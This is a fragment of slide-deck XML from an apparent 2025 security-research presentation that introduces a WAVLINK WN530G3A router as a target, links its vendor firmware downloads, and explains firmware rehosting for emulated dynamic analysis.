          <p:cNvPr descr="WAVLINK Dual-Band Wireless Router 6000Mbps, 5GHz 2.4GHz WiFi 6 Gigabit  Router with 8x5dBi Antennas, MU-MIMO, Beamforming Tech, 2500Mbps WAN/LAN,  ..." id="146" name="Google Shape;146;p20"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4721675" y="290450"/>
            <a:ext cx="3585524" cy="3340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cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="151" name="Google Shape;151;p21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3060675" y="837600"/>
            <a:ext cx="41700" cy="3846300"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="152" name="Google Shape;152;p21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="186625" y="842925"/>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153" name="Google Shape;153;p21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5979075" y="847775"/>
            <a:ext cx="10500" cy="3836100"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="154" name="Google Shape;154;p21"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="2698631" y="1801500"/>
            <a:ext cx="204654" cy="204654"/>
            <a:chOff x="259788" y="1923155"/>
            <a:chExt cx="409800" cy="409800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="155" name="Google Shape;155;p21"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="259788" y="1923155"/>
              <a:ext cx="409800" cy="4098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156" name="Google Shape;156;p21"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="362088" y="2093825"/>
              <a:ext cx="205200" cy="102600"/>
              <a:chOff x="498725" y="2069800"/>
              <a:chExt cx="205200" cy="102600"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:cxnSp>
            <p:nvCxnSpPr>
              <p:cNvPr id="157" name="Google Shape;157;p21"/>
              <p:cNvCxnSpPr/>
              <p:nvPr/>
            </p:nvCxnSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="498725" y="2069800"/>
                <a:ext cx="102600" cy="102600"/>
              </a:xfrm>
              <a:prstGeom prst="straightConnector1">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln cap="flat" cmpd="sng" w="9525">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:prstDash val="solid"/>
                <a:round/>
                <a:headEnd len="med" w="med" type="none"/>
                <a:tailEnd len="med" w="med" type="none"/>
              </a:ln>
            </p:spPr>
          </p:cxnSp>
          <p:cxnSp>
            <p:nvCxnSpPr>
              <p:cNvPr id="158" name="Google Shape;158;p21"/>
              <p:cNvCxnSpPr/>
              <p:nvPr/>
            </p:nvCxnSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="601325" y="2069800"/>
                <a:ext cx="102600" cy="102600"/>
              </a:xfrm>
              <a:prstGeom prst="straightConnector1">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln cap="flat" cmpd="sng" w="9525">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:prstDash val="solid"/>
                <a:round/>
                <a:headEnd len="med" w="med" type="none"/>
                <a:tailEnd len="med" w="med" type="none"/>
              </a:ln>
            </p:spPr>
          </p:cxnSp>
        </p:grpSp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="159" name="Google Shape;159;p21"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5618381" y="1801500"/>
            <a:ext cx="204654" cy="204654"/>
            <a:chOff x="259788" y="1923155"/>
            <a:chExt cx="409800" cy="409800"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="160" name="Google Shape;160;p21"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="259788" y="1923155"/>
              <a:ext cx="409800" cy="4098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161" name="Google Shape;161;p21"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="362088" y="2093825"/>
              <a:ext cx="205200" cy="102600"/>
              <a:chOff x="498725" y="2069800"/>
              <a:chExt cx="205200" cy="102600"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:cxnSp>
            <p:nvCxnSpPr>
              <p:cNvPr id="162" name="Google Shape;162;p21"/>
              <p:cNvCxnSpPr/>
              <p:nvPr/>
            </p:nvCxnSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="498725" y="2069800"/>
                <a:ext cx="102600" cy="102600"/>
              </a:xfrm>
              <a:prstGeom prst="straightConnector1">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln cap="flat" cmpd="sng" w="9525">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:prstDash val="solid"/>
                <a:round/>
                <a:headEnd len="med" w="med" type="none"/>
                <a:tailEnd len="med" w="med" type="none"/>
              </a:ln>
            </p:spPr>
          </p:cxnSp>
          <p:cxnSp>
            <p:nvCxnSpPr>
              <p:cNvPr id="163" name="Google Shape;163;p21"/>
              <p:cNvCxnSpPr/>
              <p:nvPr/>
            </p:nvCxnSpPr>
            <p:spPr>
              <a:xfrm flipH="1">
                <a:off x="601325" y="2069800"/>
                <a:ext cx="102600" cy="102600"/>
              </a:xfrm>
              <a:prstGeom prst="straightConnector1">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln cap="flat" cmpd="sng" w="9525">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:prstDash val="solid"/>
                <a:round/>
                <a:headEnd len="med" w="med" type="none"/>
                <a:tailEnd len="med" w="med" type="none"/>
              </a:ln>
            </p:spPr>
          </p:cxnSp>
        </p:grpSp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="164" name="Google Shape;164;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="238775" y="145950"/>
            <a:ext cx="7223400" cy="524100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3300">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Target router overview: </a:t>
            </a:r>
            <a:endParaRPr sz="3300">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="165" name="Google Shape;165;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="238775" y="4679825"/>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
        <p:nvSpPr>
          <p:cNvPr id="166" name="Google Shape;166;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="5" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6859200" y="4683725"/>
            <a:ext cx="2056500" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="b" bIns="0" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="r">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>2025</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="167" name="Google Shape;167;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="224400" y="3877700"/>
            <a:ext cx="2665200" cy="790800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="91425" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="91425">
            <a:normAutofit fontScale="40000" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPct val="50422"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="2181">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Model:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="2181">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:rPr>
              <a:t> QUANTUM D2G/WL-WN530G3A</a:t>
            </a:r>
            <a:endParaRPr sz="2181">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPct val="84615"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1300" u="sng"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1300"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="168" name="Google Shape;168;p21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3192475" y="1202150"/>
            <a:ext cx="2665200" cy="337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688"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1075">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Obtaining the Firmware</a:t>
            </a:r>
            <a:endParaRPr sz="1075">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="688"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1012">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>- You may browse all firmware for this model router:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1012">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:uFill>
                  <a:noFill/>
                </a:uFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
                <a:hlinkClick r:id="rId3">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1325">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="688"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1012" u="sng">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
                <a:hlinkClick r:id="rId4">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://docs.wavlink.xyz/Firmware/fm-530g3a/</a:t>
            </a:r>
            <a:endParaRPr sz="1012" u="sng">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="688"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1012">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>- You may obtain a copy of the firmware from this url:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1012">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:uFill>
                  <a:noFill/>
                </a:uFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
                <a:hlinkClick r:id="rId5">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1012">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="688"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="1012" u="sng">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
                <a:hlinkClick r:id="rId6">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://files2.wavlink.com/drivers/fw/WN530G3A_20230616_WAVLINK_M30G3_V230616.bin</a:t>
            </a:r>
            <a:endParaRPr sz="1012" u="sng">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="688"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1012" u="sng">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1200"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="688"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1325">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="169" name="Google Shape;169;p21"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId7">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="165068" y="916525"/>
            <a:ext cx="2853150" cy="2853150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="170" name="Google Shape;170;p21"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId8">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6110975" y="916525"/>
            <a:ext cx="2849625" cy="2510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2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="228600" y="234750"/>
            <a:ext cx="5708100" cy="510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200">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="lt1"/>
                </a:highlight>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>What is Rehosting?</a:t>
            </a:r>
            <a:endParaRPr sz="3200">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:highlight>
                <a:schemeClr val="lt1"/>
              </a:highlight>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="176" name="Google Shape;176;p22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="240800" y="784175"/>
            <a:ext cx="8545800" cy="36246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Firmware rehosting is the process of extracting the software from an embedded device and running it in an emulated environment on a separate, non-native machine</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It enables security researchers and developers to perform dynamic analysis, testing, and debugging on firmware without needing the original, resource-constrained physical hardware</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr b="1" sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Why rehost vs Purchase?</a:t>
            </a:r>
            <a:endParaRPr b="1"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Sometimes the embedded system is not </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>available</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t> for purchase in your location</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a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Sometimes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>it's</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t> simply out of the budget</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lang="en" sz="1900" u="sng">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
                <a:hlinkClick r:id="rId3">
                  <a:extLst>
                    <a:ext uri="{A12FA001-AC4F-418D-AE19-62706E023703}">
                      <ahyp:hlinkClr val="tx"/>
                    </a:ext>
                  </a:extLst>
                </a:hlinkClick>
              </a:rPr>
              <a:t>https://github.com/therealsaumil/emux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbani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3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
